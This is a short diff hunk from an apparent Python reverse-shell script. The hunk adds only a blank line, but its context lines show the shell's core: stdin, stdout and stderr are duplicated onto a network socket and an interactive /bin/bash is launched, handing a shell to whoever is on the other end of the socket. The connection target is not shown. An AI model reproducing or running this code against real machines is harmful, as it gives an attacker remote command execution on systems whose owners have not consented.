@@ -47,3 +47,4 @@ if __name__ == "__main__":
     dup2(socket_sock.fileno(),1) # used for request I/O actions from the OS
     dup2(socket_sock.fileno(),2)
     run(["/bin/bash"], shell=True) # run the bash console interactive shell
+
